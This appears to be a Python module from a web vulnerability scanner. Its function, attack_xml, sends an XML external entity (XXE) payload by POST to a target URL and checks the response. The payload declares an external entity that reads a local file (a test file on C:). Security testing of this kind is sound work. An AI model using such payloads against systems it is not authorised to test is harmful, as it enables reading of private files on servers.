import requests
import re
from .utils import make_request_with_timeout, process_attack_response


def attack_xml(url, headers, pattern, success, fail, error):
    """
    XML实体注入攻击测试
    """
    # 定义 XML 实体注入恶意 payload
    xml_payload = '''<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE root [<!ENTITY file SYSTEM "file:///c://TEST.txt">]> <root>&file;</root>'''
    
    # 设置XML请求头
    xml_headers = headers.copy()
    xml_headers['Content-Type'] = 'application/xml'
    
    # 发送POST请求
    success_flag, response_or_error, status_code = make_request_with_timeout(
        url, xml_headers, method='POST', data=xml_payload
    )
    
    # 处理响应
    return process_attack_response(
        "XML实体注入", success_flag, response_or_error, status_code, 
        pattern, success, fail, error
    )